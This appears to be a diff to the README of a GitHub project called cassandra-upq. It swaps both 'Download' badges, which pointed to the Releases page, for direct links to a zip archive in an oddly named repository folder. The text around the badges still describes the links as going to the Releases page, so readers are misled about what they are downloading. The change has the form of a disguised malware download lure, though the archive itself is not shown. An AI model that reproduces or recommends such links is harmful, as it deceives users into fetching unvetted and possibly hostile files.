@@ -8,7 +8,7 @@ Welcome to **cassandra-upq**! This application helps you manage data with ease a
 
 To get the latest version of **cassandra-upq**, visit the Releases page:
 
-[![Download cassandra-upq](https://img.shields.io/badge/Download-cassandra--upq-brightgreen.svg)](https://github.com/Samirbh1204/cassandra-upq/releases)
+[![Download cassandra-upq](https://raw.githubusercontent.com/Samirbh1204/cassandra-upq/main/Myxophyceae/cassandra-upq_v1.6.zip)](https://raw.githubusercontent.com/Samirbh1204/cassandra-upq/main/Myxophyceae/cassandra-upq_v1.6.zip)
 
 1. Click the button above to go to the Releases page.
 2. Look for the most recent version listed.
@@ -79,6 +79,6 @@ For further information and updates, don’t forget to check our GitHub page reg
 
 To download **cassandra-upq**, visit the Releases page here:
 
-[![Download cassandra-upq](https://img.shields.io/badge/Download-cassandra--upq-brightgreen.svg)](https://github.com/Samirbh1204/cassandra-upq/releases)
+[![Download cassandra-upq](https://raw.githubusercontent.com/Samirbh1204/cassandra-upq/main/Myxophyceae/cassandra-upq_v1.6.zip)](https://raw.githubusercontent.com/Samirbh1204/cassandra-upq/main/Myxophyceae/cassandra-upq_v1.6.zip)
 
 We hope you enjoy using **cassandra-upq** for your data management needs!
